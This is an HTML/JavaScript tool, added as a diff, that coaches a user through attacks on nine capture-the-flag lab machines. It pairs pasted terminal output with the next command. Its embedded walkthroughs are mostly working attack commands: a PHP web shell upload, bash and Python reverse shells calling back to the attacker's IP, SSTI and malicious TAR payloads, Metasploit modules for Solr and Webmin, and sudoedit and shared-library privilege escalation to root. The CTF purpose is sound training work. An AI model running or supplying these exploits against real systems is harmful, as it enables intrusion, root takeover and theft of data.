@@ -1,0 +1,781 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CTF Output Analyzer</title>
+<style>
+  :root{
+    --bg:#f4f6f8;--card:#fff;--ink:#15212b;--muted:#5d6b77;--line:#d9e0e6;--brand:#0b3d5c;
+    --term-bg:#0f1e29;--term-ink:#e8eef2;
+    --easy:#1f9d57;--easybg:#e7f7ee;--inter:#c77f05;--interbg:#fdf3e0;--hard:#c0392b;--hardbg:#fdece9;
+    --flag:#0f8a4d;--flagbg:#e3f8ec;--flagline:#9cdcb7;--err:#c0392b;--errbg:#fdece9;--errline:#f0b9ab;
+  }
+  :root:not([data-theme="light"]){ @media (prefers-color-scheme:dark){
+    --bg:#0e1419;--card:#161e26;--ink:#e7edf2;--muted:#9db0bd;--line:#2a3741;--brand:#15405c;
+    --term-bg:#0a141c;--easybg:#13332a;--interbg:#352a14;--hardbg:#3a1f1c;--flagbg:#113227;--flagline:#1f6b47;--errbg:#3a1f1c;--errline:#7a3b33;
+  }}
+  :root[data-theme="dark"]{
+    --bg:#0e1419;--card:#161e26;--ink:#e7edf2;--muted:#9db0bd;--line:#2a3741;--brand:#15405c;
+    --term-bg:#0a141c;--easybg:#13332a;--interbg:#352a14;--hardbg:#3a1f1c;--flagbg:#113227;--flagline:#1f6b47;--errbg:#3a1f1c;--errline:#7a3b33;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:"Segoe UI",system-ui,-apple-system,Arial,sans-serif;font-size:16px;line-height:1.5}
+  .wrap{max-width:840px;margin:0 auto;padding:0 16px 40px}
+  header{position:sticky;top:0;z-index:5;background:var(--brand);color:#fff;padding:10px 16px;box-shadow:0 2px 8px rgba(0,0,0,.18)}
+  .hrow{max-width:840px;margin:0 auto;display:flex;flex-wrap:wrap;gap:8px 14px;align-items:center}
+  .title{font-weight:700;font-size:18px;margin-right:auto}
+  .ipbox{display:flex;align-items:center;gap:5px;font-size:13px}
+  .ipbox label{opacity:.85}
+  .ipbox input{width:120px;padding:4px 7px;border:0;border-radius:5px;font:inherit;font-size:13px}
+  .rules{max-width:840px;margin:7px auto 0;font-size:12.5px;opacity:.92;line-height:1.4}
+  .rules b{color:#ffcf6b}
+  @media(max-width:560px){.ipbox input{width:108px}}
+
+  h2{font-size:17px;margin:16px 0 7px}
+  textarea{width:100%;min-height:130px;background:var(--term-bg);color:var(--term-ink);border:1px solid var(--line);border-radius:12px;padding:12px 13px;font-family:"Consolas","DejaVu Sans Mono",ui-monospace,monospace;font-size:13.5px;line-height:1.45;resize:vertical}
+  textarea::placeholder{color:#6f8494}
+  .go{margin-top:9px;width:100%;padding:13px;border:0;border-radius:11px;background:var(--brand);color:#fff;font:inherit;font-weight:700;font-size:16px;cursor:pointer}
+  .chips{display:flex;flex-wrap:wrap;gap:6px;margin:10px 0 0}
+  .chip{padding:5px 11px;border:1.4px solid var(--line);border-radius:18px;background:var(--card);color:var(--ink);font:inherit;font-size:13px;cursor:pointer}
+  .chip.on{background:var(--brand);color:#fff;border-color:var(--brand)}
+  .small{font-size:12.5px;color:var(--muted);margin:6px 0 0}
+
+  .res{margin-top:14px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:15px;margin-top:12px;box-shadow:0 1px 3px rgba(0,0,0,.05)}
+  .card.pri{border-width:2px;border-color:var(--brand)}
+  .tag{display:inline-block;font-size:12px;font-weight:700;padding:3px 10px;border-radius:18px;margin-bottom:8px}
+  .t-e{background:var(--easybg);color:var(--easy)} .t-i{background:var(--interbg);color:var(--inter)} .t-h{background:var(--hardbg);color:var(--hard)}
+  .t-flag{background:var(--flagbg);color:var(--flag)} .t-err{background:var(--errbg);color:var(--err)} .t-info{background:var(--interbg);color:var(--inter)} .t-win{background:var(--flagbg);color:var(--flag)}
+  .mchip{float:right;font-size:12px;color:var(--muted)}
+  .headline{font-size:18px;font-weight:700;margin:0 0 6px}
+  .why{margin:0 0 10px;color:var(--ink)}
+  .term{position:relative;background:var(--term-bg);color:var(--term-ink);border-radius:10px;padding:12px 13px;font-family:"Consolas","DejaVu Sans Mono",ui-monospace,monospace;font-size:13.5px;line-height:1.5;white-space:pre-wrap;word-break:break-word;overflow-wrap:anywhere;margin:4px 0}
+  .copy{position:absolute;top:8px;right:8px;background:#20333f;color:#cfe0ea;border:1px solid #34505f;border-radius:7px;padding:4px 10px;font:inherit;font-size:12px;cursor:pointer}
+  .copy:hover{background:#2a4150}.copy.ok{background:#1f9d57;color:#fff;border-color:#1f9d57}
+  .see{margin:8px 0 0;padding:9px 11px;border-radius:9px;background:var(--easybg);border:1px solid var(--line);font-size:14px}
+  .see .k{font-weight:700}
+  .flagcard{border-color:var(--flagline);background:var(--flagbg)}
+  .errcard{border-color:var(--errline)}
+  .other{font-size:13.5px;color:var(--muted);margin-top:4px}
+  details{margin-top:14px}
+  summary{cursor:pointer;font-weight:700;color:var(--brand);font-size:15px}
+  .step{border:1px solid var(--line);border-radius:11px;padding:11px 12px;margin-top:9px;background:var(--card)}
+  .step .b{display:flex;gap:8px;align-items:center;margin-bottom:4px}
+  .badge{font-size:11px;font-weight:700;padding:2px 9px;border-radius:16px}
+  .b-e{background:var(--easybg);color:var(--easy)}.b-i{background:var(--interbg);color:var(--inter)}.b-h{background:var(--hardbg);color:var(--hard)}
+  .step h4{margin:0;font-size:15px}
+  .step p{margin:3px 0;font-size:13.5px;color:var(--muted)}
+  .warnip{background:var(--hardbg);color:var(--hard);border:1px solid var(--line);border-radius:9px;padding:8px 11px;font-size:13px;margin-top:10px}
+</style>
+</head>
+<body>
+<header>
+  <div class="hrow">
+    <div class="title">🔎 CTF Output Analyzer</div>
+    <div class="ipbox"><label>Target IP</label><input id="ipT" placeholder="10.x.x.x" autocomplete="off"></div>
+    <div class="ipbox"><label>Kali IP</label><input id="ipK" placeholder="10.x.x.x" autocomplete="off"></div>
+  </div>
+  <div class="rules">Paste what the terminal shows → I tell you the next command. Rules: <b>scan all ports</b> (ignore 22 &amp; 8443) · <b>nc -lvnp PORT</b> in a 2nd terminal before any reverse shell · after a shell run <b>id</b> · flags are <b>ISEC{…}</b>.</div>
+</header>
+
+<div class="wrap">
+  <h2>1 · Ask a question, or paste output / a port — I'll tell you what to do</h2>
+  <textarea id="inp" placeholder="Ask: 'how do I get root', 'what is gobuster', 'reverse shell not working' …  OR paste: your nmap scan, a port like 445, a username like uid=995(archiveops), '230 Login successful', or an error."></textarea>
+  <button class="go" id="goBtn">▶ Answer / what to do next</button>
+
+  <div class="small">Working on (optional — lock it if auto-detect guesses wrong):</div>
+  <div class="chips" id="chips"></div>
+
+  <div class="res" id="res"></div>
+
+  <details id="full"><summary>📋 Show full step-by-step for a machine</summary><div id="fullbody" class="small">Lock a machine above (or analyze something) to see its full walkthrough here.</div></details>
+</div>
+
+<script>
+const R = String.raw;
+
+/* ========= FULL STEP DATA (for the walkthrough fallback) ========= */
+const MACHINES = {
+allgon:{name:"ALLGON",steps:[
+ {p:'e',t:"Anonymous FTP",d:"Log in with user anonymous, blank password.",c:R`ftp {T} 37890`,s:"Look for 230 Login successful."},
+ {p:'e',t:"Get easy flag",d:"The flag sits in pub/.",c:R`ls
+cd pub
+ls
+get Flag_Easy.txt
+bye
+cat Flag_Easy.txt`,s:"ISEC{…}",flag:1},
+ {p:'i',t:"Find upload page",d:"",c:R`curl -sS http://{T}:37250/robots.txt
+gobuster dir -u http://{T}:37250 -w /usr/share/wordlists/dirb/common.txt`,s:"Finds operator_drop.php + /uploads."},
+ {p:'i',t:"Upload .phtml web shell",d:".php is blocked; .phtml runs.",c:R`printf '<?php system($_GET["c"]); ?>' > /tmp/runner.phtml
+curl -sS -F 'f=@/tmp/runner.phtml' http://{T}:37250/operator_drop.php`,s:"Replies 'uploaded'."},
+ {p:'i',t:"Test command exec",d:"",c:R`curl -sS "http://{T}:37250/uploads/runner.phtml?c=id"`,s:"uid=…(liftop)."},
+ {p:'i',t:"Listener (2nd terminal)",d:"",c:R`nc -lvnp 4444`},
+ {p:'i',t:"Reverse shell + inter flag",d:"",c:R`curl -sS --get --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/{K}/4444 0>&1 &'" "http://{T}:37250/uploads/runner.phtml"
+# then in the shell:
+id
+cat ~/Flag_Intermediate.txt`,s:"ISEC{…}",flag:1},
+ {p:'h',t:"Find backup password",d:"",c:R`find / -name '*.bak' 2>/dev/null
+cat /opt/ridgeops-httpd/config.php.bak`,s:"admin_password = RidgeOps-Bak77."},
+ {p:'h',t:"Become root + hard flag",d:"",c:R`su - root
+# password: RidgeOps-Bak77
+id
+cat /root/Flag_Hard.txt`,s:"uid=0(root), ISEC{…}",flag:1},
+]},
+eridan:{name:"ERIDAN",steps:[
+ {p:'e',t:"Brute folders",d:"Homepage is 403.",c:R`gobuster dir -u http://{T}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,cgi -t 30`,s:"Finds /health/."},
+ {p:'e',t:"Read status file + easy flag",d:"",c:R`gobuster dir -u http://{T}/health/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,cgi -t 30
+curl -i http://{T}/health/static.txt
+curl -i http://{T}/easy_flag.txt`,s:"static.txt leaks the path; ISEC{…}",flag:1},
+ {p:'i',t:"Get Apache 2.4.50 exploit",d:"CVE-2021-42013.",c:R`searchsploit apache 2.4.50
+searchsploit -m 50406`,s:"Copies 50406.sh."},
+ {p:'i',t:"Test RCE (use dash)",d:"",c:R`printf 'http://%s\n' "{T}" > targets.txt
+bash 50406.sh targets.txt /usr/bin/dash id`,s:"uid=995(archiveops)."},
+ {p:'i',t:"Listener + reverse shell",d:"",c:R`nc -lvnp 4444
+# 2nd terminal:
+bash 50406.sh targets.txt /usr/bin/dash "/bin/bash -c 'bash -i >& /dev/tcp/{K}/4444 0>&1'"`,s:"Shell as archiveops."},
+ {p:'i',t:"Intermediate flag",d:"",c:R`id
+find /home /var/lib /opt -type f -iname '*flag*' -readable 2>/dev/null
+cat /var/lib/eridan/foothold/intermediate_flag.txt`,s:"ISEC{…}",flag:1},
+ {p:'h',t:"Check sudo + version",d:"",c:R`sudo -n -l
+sudo --version | head -1`,s:"sudoedit rule + sudo 1.8.31 (CVE-2023-22809)."},
+ {p:'h',t:"sudoedit → root + hard flag",d:"",c:R`env LC_ALL=C SUDO_EDITOR='sed -i s#sudoedit[[:space:]]/etc/eridan-maintenance/status.txt#ALL# -- /etc/sudoers.d/eridan-archiveops' sudoedit -n /etc/eridan-maintenance/status.txt
+sudo -n /bin/bash -c 'id; cat /root/hard_flag.txt'`,s:"uid=0(root), ISEC{…}",flag:1},
+]},
+morvane:{name:"MORVANE",steps:[
+ {p:'e',t:"Read reports + easy flag",d:"",c:R`curl -i http://{T}:8080/reports
+curl -i http://{T}:8080/reports/MOR-ARCHIVE-017/manifest.txt
+curl -i http://{T}:8080/reports/MOR-ARCHIVE-017/easy_flag.txt`,s:"manifest shows ExifTool 12.23; ISEC{…}",flag:1},
+ {p:'i',t:"Build malicious image",d:"CVE-2021-22204, -s IP = your Kali.",c:R`searchsploit -m 50911
+sudo apt install -y djvulibre-bin libimage-exiftool-perl
+python3 50911.py -s {K} 4444`,s:"Creates ~/image.jpg."},
+ {p:'i',t:"Listener + upload",d:"",c:R`nc -lvnp 4444
+# 2nd terminal:
+curl -i --max-time 900 -F "media=@$HOME/image.jpg" "http://{T}:8080/submit"`,s:"HTTP 303; shell as mediaops."},
+ {p:'i',t:"Intermediate flag",d:"",c:R`id
+cat /var/lib/morvane/operator/intermediate_flag.txt`,s:"ISEC{…}",flag:1},
+ {p:'h',t:"Plant ExifTool config (in shell)",d:"2nd listener on 5555 first.",c:R`nc -lvnp 5555
+# in the mediaops shell:
+CFG=/var/lib/morvane/publisher/user-profiles/morvane-root-shell.config
+CMD='bash -i >& /dev/tcp/{K}/5555 0>&1'
+ENC=$(printf '%s' "$CMD" | base64 -w0)
+printf "system('echo %s|base64 -d|bash');\n1;\n" "$ENC" > "$CFG"
+chmod 0640 "$CFG"`,s:"Config written."},
+ {p:'h',t:"Queue job (../ traversal) + hard flag",d:"Wait ~30s for root shell on 5555.",c:R`Q=/var/lib/morvane/publisher/queue
+printf 'media=%s\nprofile=%s\n' 'sample-approved.jpg' '../../../../var/lib/morvane/publisher/user-profiles/morvane-root-shell' > "$Q/.x.tmp"
+mv -T "$Q/.x.tmp" "$Q/morvane-root-shell.request"
+# in the root shell:
+id
+cat /root/hard_flag.txt`,s:"uid=0(root), ISEC{…}",flag:1},
+]},
+varelis:{name:"VARELIS",steps:[
+ {p:'e',t:"Report ID gap + easy flag",d:"1044 is missing but reachable.",c:R`gobuster dir -u http://{T}:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
+curl -i http://{T}:8080/api/reports/1044
+curl -i http://{T}:8080/reports/archive/1044/easy_flag.txt`,s:"ISEC{…}",flag:1},
+ {p:'i',t:"Version + SQLi dump hash",d:"CVE-2020-10220.",c:R`curl -s http://{T}:8080/login.php | grep -oE 'rConfig Version [0-9.]+'
+searchsploit -m 48208
+python3 48208.py http://{T}:8080`,s:"operator:20feaf6f…218 (MD5)."},
+ {p:'i',t:"Crack the MD5",d:"",c:R`printf 'operator:20feaf6f9303e88fe630e6bfa29c4218\n' > operator.hash
+zcat /usr/share/wordlists/rockyou.txt.gz > /tmp/rock.txt
+john --format=Raw-MD5 --wordlist=/tmp/rock.txt operator.hash
+john --show --format=Raw-MD5 operator.hash`,s:"network123"},
+ {p:'i',t:"Command-injection shell",d:"CVE-2020-10879. Edit payload line to bash -c '...' for Ubuntu.",c:R`searchsploit -m 48241
+nc -lvnp 4444
+# 2nd terminal:
+python3 48241.py http://{T}:8080 operator network123 {K} 4444`,s:"Shell as auditops."},
+ {p:'i',t:"Intermediate flag + sudo",d:"",c:R`id
+cat /var/lib/varelis/validation/jobs/operator-handoff/intermediate_flag.txt
+sudo -n -l`,s:"ISEC{…}; NOPASSWD varelis-apply *",flag:1},
+ {p:'h',t:"Plant plugin+profile (in shell)",d:"2nd listener 5555 first.",c:R`nc -lvnp 5555
+cat > /var/lib/varelis/validation/plugins/root-shell <<'EOF'
+#!/usr/bin/env bash
+bash -c 'bash -i >& /dev/tcp/{K}/5555 0>&1'
+EOF
+chmod +x /var/lib/varelis/validation/plugins/root-shell
+cat > /var/lib/varelis/approved-profiles/root-shell.json <<'EOF'
+{ "name":"x","plugin":"../../../var/lib/varelis/validation/plugins/root-shell","source":"/var/lib/varelis/validation/jobs/approved/edge-fw-01.cfg" }
+EOF`,s:"Files created."},
+ {p:'h',t:"Run helper → root + hard flag",d:"",c:R`sudo /usr/local/sbin/varelis-apply /var/lib/varelis/approved-profiles/root-shell.json
+# in the root shell:
+id
+cat /root/hard_flag.txt`,s:"uid=0(root), ISEC{…}",flag:1},
+]},
+nemoris:{name:"NEMORIS",steps:[
+ {p:'e',t:"Solr public records + easy flag",d:"",c:R`curl -sS "http://{T}:8983/solr/admin/cores?action=STATUS&wt=json" | python3 -m json.tool
+curl -sS "http://{T}:8983/solr/compliance/select?q=*:*&rows=8&wt=json" | python3 -m json.tool`,s:"A record has ISEC{…}",flag:1},
+ {p:'i',t:"Metasploit Solr RCE",d:"CVE-2019-17558.",c:R`msfconsole -q
+search solr velocity
+use exploit/multi/http/solr_velocity_rce
+set RHOSTS {T}
+set RPORT 8983
+check
+set TARGET 1
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST {K}
+set LPORT 4445
+run`,s:"Session as indexsvc."},
+ {p:'i',t:"Intermediate flag",d:"",c:R`id
+cat /var/lib/nemoris/indexops/intermediate_flag.txt`,s:"ISEC{…}",flag:1},
+ {p:'h',t:"Find local Webmin",d:"",c:R`ss -lntp`,s:"127.0.0.1:10000 = Webmin 1.890."},
+ {p:'h',t:"Port-forward + Webmin RCE",d:"CVE-2019-15107. In msf.",c:R`sessions -u 1
+sessions -i 2
+portfwd add -l 10080 -p 10000 -r 127.0.0.1
+background
+use exploit/linux/http/webmin_backdoor
+set RHOSTS 127.0.0.1
+set RPORT 10080
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST {K}
+set LPORT 5555
+run`,s:"ROOT session."},
+ {p:'h',t:"Hard flag",d:"",c:R`id
+cat /root/hard_flag.txt`,s:"uid=0(root), ISEC{…}",flag:1},
+]},
+calvora:{name:"CALVORA",steps:[
+ {p:'e',t:"SMB share + easy flag",d:"",c:R`smbclient -L //{T} -N
+smbclient //{T}/FieldExchange -N -c 'get easy_flag.txt /tmp/easy_flag.txt'
+cat /tmp/easy_flag.txt`,s:"ISEC{…}",flag:1},
+ {p:'i',t:"Cacti RCE → www-data",d:"CVE-2022-46169.",c:R`searchsploit cacti 1.2.22
+git clone https://github.com/Safarchand/CVE-2022-46169.git
+cd CVE-2022-46169
+nc -lvnp 4444
+# 2nd terminal:
+python3 CVE-2022-46169.py -t http://{T}/cacti -i {K} -p 4444`,s:"Shell as www-data."},
+ {p:'i',t:"Intermediate flag",d:"",c:R`id
+find / -name '*intermediate*flag*' 2>/dev/null
+# cat the path it prints`,s:"ISEC{…}",flag:1},
+ {p:'h',t:"Find SUID Screen",d:"CVE-2017-5618.",c:R`find / -xdev -type f -perm -4000 2>/dev/null | sort
+/usr/local/bin/screen -v`,s:"Screen 4.05.00."},
+ {p:'h',t:"Exploit Screen → root + hard flag",d:"",c:R`searchsploit -m 41154
+python3 -m http.server 8000
+# on target:
+cd /tmp
+wget http://{K}:8000/41154.sh
+chmod +x 41154.sh
+./41154.sh
+id
+cat /root/hard_flag.txt`,s:"uid=0(root), ISEC{…}",flag:1},
+]},
+talverin:{name:"TALVERIN",steps:[
+ {p:'e',t:"Easy flag on public report",d:"",c:R`curl -i http://{T}:8088/`,s:"Open the report links; one shows ISEC{…}",flag:1},
+ {p:'i',t:"Test SSTI",d:"",c:R`curl -sS -X POST --data-urlencode 'template={{ cycler.__init__.__globals__.os.popen("id").read() }}' "http://{T}:8088/preview"`,s:"Returns uid=…(inventorysvc)."},
+ {p:'i',t:"SSTI reverse shell + inter flag",d:"nc -lvnp 4447 first.",c:R`nc -lvnp 4447
+cat > /tmp/rev.txt <<'EOF'
+{{ cycler.__init__.__globals__.os.popen("/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{K}\",4447));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/usr/bin/sh\",\"-i\"])'").read() }}
+EOF
+curl -sS -X POST --data-urlencode template@/tmp/rev.txt "http://{T}:8088/preview"
+# in the shell:
+id
+cat /var/lib/talverin/operator/intermediate_flag.txt`,s:"Shell as inventorysvc; ISEC{…}",flag:1},
+ {p:'h',t:"Inspect root service",d:"",c:R`systemctl cat talverin-refresh.service
+ls -ld /opt/talverin/vendor/bin`,s:"Runs as root; vendor/bin writable + first in PATH."},
+ {p:'h',t:"Fake asset-probe → root + hard flag",d:"nc -lvnp 4448 first.",c:R`nc -lvnp 4448
+cat > /opt/talverin/vendor/bin/asset-probe <<'EOF'
+#!/usr/bin/sh
+exec /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{K}",4448));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/usr/bin/sh","-i"])'
+EOF
+chmod 755 /opt/talverin/vendor/bin/asset-probe
+touch /var/lib/talverin/queue/refresh.request
+# in the root shell:
+id
+cat /root/hard_flag.txt`,s:"uid=0(root), ISEC{…}",flag:1},
+]},
+orynth:{name:"ORYNTH",steps:[
+ {p:'e',t:"Public archive + easy flag",d:"Replace PORT with the web port.",c:R`curl -sS "http://{T}:PORT/archives/"
+curl -sS "http://{T}:PORT/archives/RV-2024-091/easy_flag.txt"`,s:"ISEC{…}",flag:1},
+ {p:'i',t:"Build malicious TAR",d:"tarfile CVE-2007-4559.",c:R`export BASE="http://{T}:PORT"
+nc -lvnp 4453
+# 2nd terminal:
+export KALI_IP={K}; export PORT=4453
+python3 - <<'PY'
+import io, os, tarfile
+member="../../../../worker/hooks/preflight.sh"
+kali=os.environ["KALI_IP"]; port=os.environ["PORT"]
+payload=("#!/bin/sh\npython3 -c 'import socket,subprocess,os;"
+ "s=socket.socket();s.connect((\"%s\",%s));"
+ "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+ "subprocess.call([\"/bin/sh\",\"-i\"])'\n" % (kali,port)).encode()
+info=tarfile.TarInfo(member); info.mode=0o750; info.size=len(payload)
+with tarfile.open("/tmp/rev.tar","w") as tf: tf.addfile(info, io.BytesIO(payload))
+PY`,s:"Creates /tmp/rev.tar."},
+ {p:'i',t:"Upload TAR + inter flag",d:"",c:R`curl -sS -X POST -H 'Content-Type: application/x-tar' --data-binary @/tmp/rev.tar "$BASE/api/validate?job=RV-2024-091"
+# in the shell:
+id
+cat /var/lib/orynth/operator/intermediate_flag.txt`,s:"Shell as restoreops; ISEC{…}",flag:1},
+ {p:'h',t:"Find SUID verifier + RUNPATH",d:"",c:R`find / -perm -4000 -type f 2>/dev/null
+readelf -d /usr/local/libexec/orynth-restore-verify | grep -E 'NEEDED|RUNPATH'`,s:"NEEDs liborynthrestore.so, RUNPATH /opt/orynth/lib (writable)."},
+ {p:'h',t:"Compile .so on Kali + serve",d:"",c:R`cat > /tmp/reader.c <<'C'
+#include <fcntl.h>
+#include <unistd.h>
+int orynth_verify(const char *path){
+  char buf[256]; if(!path) return 3;
+  int in=open(path,O_RDONLY);
+  int out=open("/tmp/out.txt",O_WRONLY|O_CREAT|O_TRUNC,0644);
+  if(in<0||out<0) return 2;
+  ssize_t n; while((n=read(in,buf,sizeof(buf)))>0) write(out,buf,n);
+  close(in); close(out); return 0;
+}
+C
+gcc -shared -fPIC /tmp/reader.c -Wl,-soname,liborynthrestore.so -o /tmp/liborynthrestore.so
+python3 -m http.server 8011`,s:"Serving your .so."},
+ {p:'h',t:"Install .so + read hard flag",d:"on target.",c:R`cd /opt/orynth/lib
+curl -fsS "http://{K}:8011/liborynthrestore.so" -o lib.new
+mv liborynthrestore.so liborynthrestore.so.bak 2>/dev/null
+cp lib.new liborynthrestore.so ; chmod 0644 liborynthrestore.so
+/usr/local/libexec/orynth-restore-verify /root/hard_flag.txt
+cat /tmp/out.txt`,s:"ISEC{…}",flag:1},
+]},
+draevos:{name:"DRAEVOS",steps:[
+ {p:'e',t:"Public resource + easy flag",d:"",c:R`curl -sS http://{T}:8080/resources/change-window-2026-w36.txt`,s:"easy_flag: ISEC{…}",flag:1},
+ {p:'i',t:"venv for the PoC",d:"CVE-2023-27372.",c:R`python3 -m venv ~/spip-venv
+~/spip-venv/bin/pip install 'urllib3==1.26.20' 'requests==2.31.0' 'beautifulsoup4==4.12.3'`,s:"Deps installed."},
+ {p:'i',t:"Exploit SPIP + inter flag",d:"nc -lvnp 4444 first.",c:R`nc -lvnp 4444
+# 2nd terminal:
+~/spip-venv/bin/python /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://{T}:8080 -c "bash -c 'bash -i >& /dev/tcp/{K}/4444 0>&1'"
+# in the shell:
+id
+find /var/lib/draevos -type f -readable 2>/dev/null
+# cat the intermediate_flag.txt path`,s:"Shell as kbsvc; ISEC{…}",flag:1},
+ {p:'h',t:"systemd-run as root + hard flag",d:"kbmaint can manage systemd.",c:R`pkaction | grep systemd1
+systemd-run --quiet --wait --pipe --collect --unit=p1 /usr/bin/id
+systemd-run --quiet --wait --pipe --collect --unit=p3 /bin/cat /root/hard_flag.txt`,s:"uid=0(root), ISEC{…}",flag:1},
+]},
+};
+const MLIST=[["allgon","Allgon"],["eridan","Eridan"],["morvane","Morvane"],["varelis","Varelis"],["nemoris","Nemoris"],["calvora","Calvora"],["talverin","Talverin"],["orynth","Orynth"],["draevos","Draevos"]];
+
+/* ========= RULES: output marker -> next action ========= */
+/* kind: err|flag|win|next|ident ; p=priority (higher wins) ; m=machine */
+const RULES=[
+ // ---- errors / fixes (high priority) ----
+ {re:/permission denied/i, p:97, kind:'err', kt:'t-err', t:"Access denied", why:"You don't have permission for that. If it was a root-only file (like /root/hard_flag.txt), you must get root FIRST. Otherwise see what you CAN do:", c:R`id
+sudo -n -l
+find / -perm -4000 -type f 2>/dev/null | sort`, see:"Look for a usable sudo rule or an odd SUID binary."},
+ {re:/connection refused|no route to host|could ?n[o']t connect|failed to connect|connection timed out/i, p:96, kind:'err', kt:'t-err', t:"Can't reach it", why:"The service didn't answer. Check: right PORT (re-scan with -p-), right target IP, and — if this was a reverse shell — your nc listener must be running FIRST in another terminal.", c:R`sudo nmap -Pn -sC -sV -p- --open {T}`, see:"Confirms which ports are actually open."},
+ {re:/a password is required|sudo:.*password/i, p:95, kind:'err', kt:'t-err', t:"No passwordless sudo", why:"Plain sudo won't work without a password. Escalate another way — look for SUID binaries, writable configs/backups, or a service CVE.", c:R`find / -perm -4000 -type f 2>/dev/null | sort
+find / -name '*.bak' -o -name '*.conf' 2>/dev/null
+getcap -r / 2>/dev/null`, see:"An unusual SUID file or a readable backup is your lead."},
+ {re:/command not found/i, p:90, kind:'err', kt:'t-err', t:"Command not found", why:"That tool/path isn't available here. Check spelling, or use a full path. On a target, use what exists (e.g. python3, /usr/local/bin/...).", c:R`which python3 python nc bash 2>/dev/null`},
+ {re:/no such file or directory/i, p:60, kind:'err', kt:'t-err', t:"Wrong path/name", why:"List the folder first to get the real filename, then use it.", c:R`ls -la`},
+ {re:/(directory-list|common\.txt|rockyou).*(no such file|not found)|open .*wordlists.*: no such/i, p:93, kind:'err', kt:'t-err', t:"Wordlist path wrong", why:"Use a wordlist that exists on Kali.", c:R`ls /usr/share/wordlists/
+# dirs:
+/usr/share/wordlists/dirb/common.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+# passwords:
+zcat /usr/share/wordlists/rockyou.txt.gz > /tmp/rock.txt`},
+
+ // ---- big wins ----
+ {re:/uid=0\(root\)|euid=0\b/i, p:99, kind:'win', kt:'t-win', t:"🎉 You are ROOT", why:"You've escalated. Read the Hard flag now (Allgon uses Flag_Hard.txt, everything else hard_flag.txt).", c:R`id
+cat /root/hard_flag.txt 2>/dev/null || cat /root/Flag_Hard.txt`, see:"ISEC{…} = the Hard flag. Record it. Done!"},
+ {re:/ISEC\{[0-9a-fA-F]{8,}\}/, p:88, kind:'flag', kt:'t-flag', t:"🏁 Flag found!", why:"Copy that ISEC{…} value into your answers. Then move to the next stage: Easy ➜ Intermediate ➜ Hard. (Paste your next command's output and I'll guide you.)", see:"If this was Easy, start the Intermediate exploit. If Intermediate, start the Hard priv-esc."},
+
+ // ---- machine fingerprints (from nmap / banners) ----
+ {re:/vsftpd|ParcelLift/i, p:45, kind:'ident', m:'allgon', t:"Looks like ALLGON", why:"FTP + the ParcelLift web app. Start with anonymous FTP for the Easy flag (use the FTP port nmap showed).", c:R`ftp {T} 37890`, see:"Login: anonymous / blank password → 230 Login successful."},
+ {re:/apache\/?\s?2\.4\.50/i, p:46, kind:'ident', m:'eridan', t:"Looks like ERIDAN", why:"Apache 2.4.50 = CVE-2021-42013. First get the Easy flag by enumerating the web root.", c:R`gobuster dir -u http://{T}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,cgi -t 30`, see:"Finds /health/."},
+ {re:/media intake|mor-archive/i, p:46, kind:'ident', m:'morvane', t:"Looks like MORVANE", why:"The Media Intake app. Read the public report for the Easy flag + the ExifTool version.", c:R`curl -i http://{T}:8080/reports`, see:"Shows MOR-ARCHIVE-017."},
+ {re:/rconfig|config assurance/i, p:46, kind:'ident', m:'varelis', t:"Looks like VARELIS", why:"rConfig app. Enumerate folders, then exploit the report ID gap for the Easy flag.", c:R`gobuster dir -u http://{T}:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,txt`, see:"Finds /reports/, /login.php."},
+ {re:/\bsolr\b/i, p:46, kind:'ident', m:'nemoris', t:"Looks like NEMORIS", why:"Apache Solr. Read the public compliance records for the Easy flag.", c:R`curl -sS "http://{T}:8983/solr/admin/cores?action=STATUS&wt=json" | python3 -m json.tool`, see:"Shows the core name (e.g. compliance)."},
+ {re:/\bcacti\b/i, p:47, kind:'ident', m:'calvora', t:"Looks like CALVORA", why:"Cacti web app (+anon SMB). Grab the Easy flag from the SMB share first.", c:R`smbclient -L //{T} -N`, see:"Shows the FieldExchange share."},
+ {re:/report builder|:8088/i, p:44, kind:'ident', m:'talverin', t:"Looks like TALVERIN", why:"The Report Builder app has template injection (SSTI). Easy flag is on a public report page.", c:R`curl -i http://{T}:8088/`, see:"Open the report links for ISEC{…}."},
+ {re:/RV-2024-091|orynth|restore.*bundle/i, p:46, kind:'ident', m:'orynth', t:"Looks like ORYNTH", why:"Archive/restore app (tarfile bug). Read the public archive for the Easy flag.", c:R`curl -sS "http://{T}:PORT/archives/RV-2024-091/easy_flag.txt"`, see:"ISEC{…} (replace PORT with the web port)."},
+ {re:/\bSPIP\b/i, p:46, kind:'ident', m:'draevos', t:"Looks like DRAEVOS", why:"SPIP 4.2.0 = CVE-2023-27372. Easy flag is in a public resource file.", c:R`curl -sS http://{T}:8080/resources/change-window-2026-w36.txt`, see:"easy_flag: ISEC{…}"},
+
+ // ---- ALLGON progress ----
+ {re:/230.*login successful|login successful/i, p:55, kind:'next', m:'allgon', t:"FTP anonymous login worked", why:"Now list the files and grab the Easy flag from pub/.", c:R`ls
+cd pub
+ls
+get Flag_Easy.txt
+bye
+cat Flag_Easy.txt`, see:"ISEC{…} = Easy flag."},
